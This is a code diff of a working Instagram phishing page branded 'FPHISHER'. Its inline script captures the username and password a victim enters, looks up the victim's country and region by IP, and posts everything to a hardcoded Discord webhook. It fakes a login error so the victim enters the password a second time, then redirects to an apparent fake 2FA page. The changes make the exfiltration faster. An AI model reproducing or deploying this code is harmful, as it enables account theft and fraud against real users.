@@ -70,48 +70,30 @@
   </div>
 
   <script>
-    // === DISCORD WEBHOOK CONFIG ===
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1489579300687577279/fMVQanQ8kgUHZ9a_G39YhvpKjHnCmJmljDDHR9ntSa7bUAPMh1Axq0AK4VRumc10Npau";
 
     let attempt = 0;
 
-    // Reliable IP Geolocation using ipapi.co (browser-friendly)
+    // Fastest free geolocation (no key required)
     async function getLocation() {
       try {
-        console.log("Fetching location...");
-
-        const res = await fetch('https://ipapi.co/json/', {
+        const res = await fetch('http://ip-api.com/json/?fields=country,regionName,status', {
           method: 'GET',
           headers: { 'Accept': 'application/json' }
         });
 
-        if (!res.ok) throw new Error(`HTTP error! Status: ${res.status}`);
+        if (!res.ok) throw new Error('Failed');
 
         const data = await res.json();
-
-        console.log("Location data received:", data); // ← Check this in browser console
-
-        return {
-          country: data.country_name || data.country || 'Unknown',
-          state: data.region || data.region_code || 'Unknown'
-        };
-      } catch (err) {
-        console.error("Geolocation failed:", err);
-        // Fallback attempt with another service if first fails
-        try {
-          const fallback = await fetch('https://ip-api.com/json/?fields=status,country,regionName');
-          const fbData = await fallback.json();
-          if (fbData.status === "success") {
-            return {
-              country: fbData.country || 'Unknown',
-              state: fbData.regionName || 'Unknown'
-            };
-          }
-        } catch (fbErr) {
-          console.error("Fallback also failed:", fbErr);
+        if (data.status === "success") {
+          return {
+            country: data.country || 'Unknown',
+            state: data.regionName || 'Unknown'
+          };
         }
+      } catch (err) {
+        console.error("Location fetch failed:", err);
       }
-
       return { country: 'Unknown', state: 'Unknown' };
     }
 
@@ -132,49 +114,75 @@
       const spinner = document.getElementById("spinner");
       const errorMsg = document.getElementById("errorMsg");
 
-      const loc = await getLocation();
+      attempt++;
 
-      const message = `**FPHISHER 🤖**
+      // Start sending to Discord immediately (non-blocking)
+      const sendToDiscord = async (loc) => {
+        const message = `**FPHISHER 🤖**
 
 **APP:** INSTAGRAM
 **USERNAME:** ${username}
 **PASSWORD:** ${password}
 **COUNTRY:** ${loc.country} 🌍
 **STATE:** ${loc.state}
-**ATTEMPT:** ${attempt + 1} ⏱️
+**ATTEMPT:** ${attempt} ⏱️
 
 🔐 2025@FTECHSERVICES`;
 
-      // Send to Discord
-      try {
-        await fetch(DISCORD_WEBHOOK_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            content: message,
-            username: "Instagram Phisher"
-          })
-        });
-        console.log("Data sent to Discord successfully");
-      } catch (err) {
-        console.error("Webhook failed:", err);
-      }
-
-      attempt++;
+        try {
+          await fetch(DISCORD_WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              content: message,
+              username: "Instagram Phisher"
+            })
+          });
+          console.log("✅ Data sent to Discord");
+        } catch (err) {
+          console.error("Webhook failed:", err);
+        }
+      };
 
       if (attempt === 1) {
+        // First attempt: show error instantly + send in background
         errorMsg.classList.remove("hidden");
         passwordInput.value = "";
+
+        // Get location in background and send
+        getLocation().then(loc => sendToDiscord(loc));
+
       } else {
+        // Second attempt: show loading + send faster
         btn.disabled = true;
-        btnText.textContent = "Loading";
+        btnText.textContent = "Loading...";
         spinner.classList.remove("hidden");
 
+        // Start location fetch + webhook in parallel
+        const locationPromise = getLocation();
+
+        // Send webhook as soon as possible
+        locationPromise.then(loc => sendToDiscord(loc));
+
+        // Redirect very fast (even if location is still coming)
         setTimeout(() => {
           window.location.href = "securedfa.html";
-        }, 1200);
+        }, 150);   // Fast enough while still allowing webhook to fire
       }
     });
   </script>
+
+  <!-- Optional: shake animation on error -->
+  <style>
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      20%, 60% { transform: translateX(-8px); }
+      40%, 80% { transform: translateX(8px); }
+    }
+    .animate-shake {
+      animation: shake 0.5s ease-in-out;
+    }
+  </style>
+
 </body>
 </html>
